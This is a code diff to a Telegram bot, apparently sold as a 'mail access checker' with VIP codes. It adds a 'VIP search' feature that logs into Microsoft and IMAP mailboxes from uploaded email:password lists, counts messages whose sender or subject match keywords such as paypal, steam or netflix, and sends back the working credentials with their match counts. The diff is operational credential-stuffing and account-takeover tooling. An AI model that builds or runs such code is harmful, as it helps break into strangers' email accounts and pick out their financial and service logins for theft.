@@ -1277,6 +1277,11 @@ class ScanSession:
         self.mix_bads = 0
         self.mix_service_counts = {}
         self.mix_status_msg_id = None
+        # VIP search flow
+        self.awaiting_search = False
+        self.search_keywords = []
+        self.search_results = []
+        self.search_status_msg_id = None
 
     def stop(self):
         self.stop_ev.set()
@@ -1286,6 +1291,166 @@ class BotApp:
         self.offset = None
         self.sessions = {}
         self.lock = threading.Lock()
+    
+    def _send_search_status(self, sess: ScanSession, chat_id, keywords, force=False):
+        now = time.time()
+        if not force and now - sess.last_status_time < 5:
+            return
+        vip_tag = " [VIP]" if chat_id in vip_users_info else ""
+        # Microsoft-style message
+        countries_ms = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
+        services_ms = ", ".join([f"{k}:{v}" for k, v in sorted(sess.ms_service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
+        tgt_ms = ", ".join([f"{k}:{sess.ms_search_counts.get(k,0)}" for k in keywords]) or "-"
+        ms_msg = (
+            f"Q bot mail access checker{vip_tag}\n"
+            f"check microsoft ( hotmail , outlook , etc )\n"
+            f"hits : {sess.ms_hits}\n"
+            f"bad : {sess.ms_bads}\n"
+            f"xbox : {sess.xbox_premium}\n"
+            f"country : {countries_ms}\n"
+            f"services : {services_ms}\n"
+            f"Your target keywords: {tgt_ms}\n"
+            "By : anon\n"
+            "channel : @anon_main1"
+        )
+        # MIX-style message
+        types_str = ", ".join([f"{dom}:{count}" for dom, count in sess.imap_hits_by_domain.items()]) or "-"
+        services_mix = ", ".join([f"{k}:{v}" for k, v in sorted(sess.mix_service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
+        tgt_mix = ", ".join([f"{k}:{sess.mix_search_counts.get(k,0)}" for k in keywords]) or "-"
+        mix_msg = (
+            f"Q bot mail access checker{vip_tag}\n"
+            f"check mix ( t-online.de , gmx , etc )\n"
+            f"hits : {sess.mix_hits}\n"
+            f"bad : {sess.mix_bads}\n"
+            f"type : {types_str}\n"
+            f"services : {services_mix}\n"
+            f"Your target keywords: {tgt_mix}\n"
+            "By : anon\n"
+            "channel : @anon_main1"
+        )
+        # send or edit both
+        if getattr(sess, "ms_search_msg_id", None):
+            try: edit_message(chat_id, sess.ms_search_msg_id, ms_msg)
+            except: pass
+        else:
+            try:
+                r = send_message(chat_id, ms_msg)
+                sess.ms_search_msg_id = r.get("result", {}).get("message_id")
+            except: pass
+        if getattr(sess, "mix_search_msg_id", None):
+            try: edit_message(chat_id, sess.mix_search_msg_id, mix_msg)
+            except: pass
+        else:
+            try:
+                r = send_message(chat_id, mix_msg)
+                sess.mix_search_msg_id = r.get("result", {}).get("message_id")
+            except: pass
+        sess.last_status_time = now
+    
+    def start_search(self, chat_id, accounts, keywords):
+        with self.lock:
+            sess = self.sessions.get(chat_id)
+            if not sess:
+                sess = ScanSession(chat_id)
+                self.sessions[chat_id] = sess
+        sess.search_results = []
+        sess.ms_search_counts = {}
+        sess.mix_search_counts = {}
+        self._send_search_status(sess, chat_id, keywords, force=True)
+        
+        ms_domains = ('outlook.', 'hotmail.', 'live.', 'msn.', 'windowslive.')
+        def worker(acc):
+            if sess.stop_ev.is_set():
+                return
+            em, pw = acc
+            is_ms = any(d in em for d in ms_domains)
+            if is_ms:
+                try:
+                    checker = UnifiedChecker(debug=False)
+                    auth = checker._ms_hard_login(em, pw)
+                    if not auth or not auth.get("access_token"):
+                        return
+                    at = auth["access_token"]; cid = auth.get("cid", "")
+                    found_any = False
+                    for kw in keywords:
+                        total = checker._search_count(at, cid, kw, timeout=10)
+                        if total > 0:
+                            found_any = True
+                            with self.lock:
+                                sess.ms_search_counts[kw] = sess.ms_search_counts.get(kw, 0) + total
+                    if found_any:
+                        kvs = [f"{kw}:{sess.ms_search_counts.get(kw,0)}" for kw in keywords]
+                        line = f"{em}:{pw} | " + ", ".join(kvs)
+                        with self.lock:
+                            sess.search_results.append(line)
+                except:
+                    pass
+            else:
+                # IMAP keyword scan for MIX accounts
+                try:
+                    mail = _imap_connect(em, pw)
+                    if not mail:
+                        return
+                    r, data = mail.search(None, 'ALL')
+                    if r != 'OK' or not data or not data[0]:
+                        try: mail.logout()
+                        except: pass
+                        return
+                    ids = data[0].split()
+                    counts = {kw: 0 for kw in keywords}
+                    for eid in ids[-500:]:
+                        try:
+                            r2, mdata = mail.fetch(eid, '(BODY.PEEK[HEADER])')
+                            if r2 != 'OK' or not mdata or not mdata[0]:
+                                continue
+                            raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
+                            msg = email_lib.message_from_bytes(raw)
+                            sender = (_decode_mime(msg.get('From', '')) or '').lower()
+                            subject = (_decode_mime(msg.get('Subject', '')) or '').lower()
+                            for kw in keywords:
+                                k = kw.lower()
+                                if k in sender or k in subject:
+                                    counts[kw] += 1
+                        except:
+                            continue
+                    try: mail.logout()
+                    except: pass
+                    if any(v > 0 for v in counts.values()):
+                        with self.lock:
+                            for kw, c in counts.items():
+                                if c > 0:
+                                    sess.mix_search_counts[kw] = sess.mix_search_counts.get(kw, 0) + c
+                            kvs = [f"{kw}:{counts.get(kw,0)}" for kw in keywords]
+                            line = f"{em}:{pw} | " + ", ".join(kvs)
+                            sess.search_results.append(line)
+                except:
+                    pass
+        
+        max_w = max(8, min(64, (os.cpu_count() or 4) * 4))
+        ex = ThreadPoolExecutor(max_workers=max_w)
+        fs = [ex.submit(worker, acc) for acc in accounts]
+        try:
+            pending = set(fs)
+            while pending and not sess.stop_ev.is_set():
+                done = {f for f in list(pending) if f.done()}
+                pending -= done
+                self._send_search_status(sess, chat_id, keywords)
+                time.sleep(0.5)
+        finally:
+            try: ex.shutdown(wait=False, cancel_futures=True)
+            except: pass
+        
+        # write separate results file (not merged with scan results)
+        try:
+            name = f"search_{uuid.uuid4().hex[:8]}.txt"
+            path = os.path.join(os.getcwd(), name)
+            with open(path, "w", encoding="utf-8") as f:
+                for ln in sess.search_results:
+                    f.write(ln + " | BY : @T_Q_mailbot\n")
+            send_document(chat_id, path, caption=f"Search done. Matches: {len(sess.search_results)}")
+        finally:
+            try: os.remove(path)
+            except: pass
 
     def _send_status(self, sess: ScanSession, chat_id, force=False):
         now = time.time()
@@ -1791,7 +1956,7 @@ class BotApp:
                         # ADMIN Commands
                         if chat_id == ADMIN_ID and "text" in m:
                             txt = m["text"].strip().lower()
-                            if txt in ("/start", "start"):
+                            if txt in ("/start", "start", "/admin", "admin", "/panel", "panel"):
                                 kb = {
                                     "inline_keyboard": [
                                         [{"text": "code 1 day", "callback_data": "GEN_CODE_day"}],
@@ -1815,12 +1980,11 @@ class BotApp:
                             
                         if "document" in m:
                             fid = m["document"]["file_id"]
-                            # announce to group who started and from where
+                            # announce to group who started
                             try:
                                 usr = m.get("from", {})
                                 uname = usr.get("username") or f"{usr.get('first_name','')}".strip() or str(chat_id)
-                                ip = get_ip()
-                                send_message(GROUP_ID, f"Scan started by @{uname} (chat:{chat_id}) | IP: {ip}")
+                                send_message(GROUP_ID, f"Scan started by @{uname} (chat:{chat_id})")
                             except Exception:
                                 pass
                             self.handle_file(chat_id, fid, uname if 'uname' in locals() else None)
@@ -1855,7 +2019,8 @@ class BotApp:
                                 ok, msg = try_claim_vip(from_id, code)
                                 send_message(chat_id, msg)
                                 if ok:
-                                    send_message(chat_id, "VIP activated. Please send a text file (email:pass per line) to begin scanning.")
+                                    kb = {"inline_keyboard": [[{"text": "Search", "callback_data": "VIP_SEARCH"}]]}
+                                    send_message(chat_id, "VIP activated. Please send a text file (email:pass per line) to begin scanning.\nYou can also use VIP search.", reply_markup=kb)
                                 continue
                             if txt.lower() == "stop":
                                 self.handle_stop(chat_id)
@@ -1871,6 +2036,24 @@ class BotApp:
                                 sess.pending_accounts = None
                                 t = threading.Thread(target=self.start_scan, args=(chat_id, accs), daemon=True)
                                 t.start()
+                            # handle VIP search keywords
+                            if sess and getattr(sess, "awaiting_search", False):
+                                if chat_id not in vip_users_info:
+                                    send_message(chat_id, "VIP required for search.")
+                                else:
+                                    parts = re.split(r'[,\u060C]+', txt)
+                                    kws = [p.strip() for p in parts if p.strip()]
+                                    if not kws:
+                                        send_message(chat_id, "Send keywords separated by commas.")
+                                    else:
+                                        sess.awaiting_search = False
+                                        sess.search_keywords = kws
+                                        if sess.pending_accounts:
+                                            t = threading.Thread(target=self.start_search, args=(chat_id, sess.pending_accounts, kws), daemon=True)
+                                            t.start()
+                                        else:
+                                            send_message(chat_id, "Send the accounts file first, then press Search.")
+                                continue
                     elif "callback_query" in upd:
                         cq = upd["callback_query"]
                         data = cq.get("data", "")
@@ -1898,6 +2081,15 @@ class BotApp:
 
                         if data.startswith("STOP_"):
                             self.handle_stop(chat_id)
+                        elif data == "VIP_SEARCH":
+                            if chat_id in vip_users_info:
+                                with self.lock:
+                                    sess = self.sessions.get(chat_id) or ScanSession(chat_id)
+                                    self.sessions[chat_id] = sess
+                                    sess.awaiting_search = True
+                                send_message(chat_id, "Send search keywords (comma separated), e.g.: paypal, steam, netflix")
+                            else:
+                                send_message(chat_id, "VIP required for search.")
                         elif data.startswith("MODE_SELECT_MS_"):
                             self._handle_mode_select(chat_id, "MS")
                         elif data.startswith("MODE_SELECT_IMAP_"):
